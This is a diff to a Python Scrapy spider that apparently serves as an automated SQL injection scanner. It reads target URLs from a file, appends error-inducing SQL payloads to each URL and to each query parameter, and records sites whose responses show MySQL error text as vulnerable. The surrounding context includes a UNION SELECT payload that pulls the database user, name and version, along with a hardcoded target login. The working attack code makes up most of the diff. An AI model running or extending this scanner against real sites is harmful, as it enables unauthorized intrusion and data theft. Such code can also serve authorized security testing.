@@ -10,6 +10,7 @@ from scrapy.http.request import Request
 from scrapy.http import FormRequest
 from scrapy import log
 from loginform import fill_login_form
+import copy
 
 login_url = "https://app4.com"
 username = "admin@admin.com"
@@ -21,6 +22,9 @@ payload = "'kasdgh"#"%27+and+1=2+union+select+1,user%28%29,database%28%29,versio
 error_payloads = ["+and+SLAP(10)+--+",
 					"'kasdgh",
 					"+AND+SEELCT"]
+links = open('links.txt','r')
+urls = links.readlines()
+links.close()
 
 class step3(Spider):
 	name = "step3"
@@ -52,10 +56,10 @@ class step3(Spider):
 			f.write(response.body)
 			f.close()'''
 			print "response end!!\n"
-			
-			temp = login_url + attack_url + "?" + query_string
-			yield Request(url=temp, callback=self.save_original_resp)
-		
+			for temp in urls:
+					yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
+			#temp = login_url + attack_url + "?" + query_string
+			#yield Request(url=temp, callback=self.save_original_resp)
 		return 
 	'''
 	def after_login(self, response):
@@ -66,16 +70,37 @@ class step3(Spider):
 	'''
 	def save_original_resp(self, response):
 		print "i am here too:" + response.url
+		temp = response.request.meta['temp']
+		newfile = open('linksWithFalsePayloads.txt','a')
 		#print "Response: " + response.url
 		file = open("original_response.html", "w")
 		file.write(response.body)
 		file.close()
+		#attack_with_payload = login_url + attack_url + "?" + query_string + payload
+		for error in error_payloads:
+				attack_with_payload = temp+error
+				newfile.write(attack_with_payload+"\n")
+				yield Request(attack_with_payload, meta={'temp':temp}, callback=self.save_attack_resp)
+				if "&" in temp:
+						queryVals = temp.split('&')
+						length = len(queryVals)
+						for i in range(0,length-1):
+								dupVals = copy.copy(queryVals);
+								dupVals[i] = dupVals[i]+error
+								finLink = "";
+								for i in range(0,length-1):
+										if i == 0:
+												finLink += dupVals[i]
+										else:
+												finLink += "&"+dupVals[i]
+								newfile.write(finLink+"\n")
+								yield Request(finLink, meta={'temp':temp}, callback=self.save_attack_resp)
+				print "Did you see this"
+		#attack_with_payload = temp+payload
+		#print "With payload: " + attack_with_payload
 		
-		attack_with_payload = login_url + attack_url + "?" + query_string + payload
-		print "With payload: " + attack_with_payload
-		
-		yield Request(attack_with_payload, callback=self.save_attack_resp) 
-		
+		#yield Request(attack_with_payload, callback=self.save_attack_resp)
+		newfile.close()
 		return 
 
 	def save_attack_resp(self, response):
@@ -83,10 +108,14 @@ class step3(Spider):
 		file = open("attack_response.html", "w")
 		file.write(response.body)
 		file.close()
+		temp = response.request.meta['temp']
 
 		searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column", "fatal error", "stack trace"]
 		#if searchterms in response.body:
 		if any(term in response.body.lower() for term in searchterms):
 			self.log("\tVulnerable link: " + response.url, level=log.INFO)
+			file2 = open("vulnerableinks.txt","w")
+			file2.write(temp+"\n")
+			file2.close()
 		return None
 	
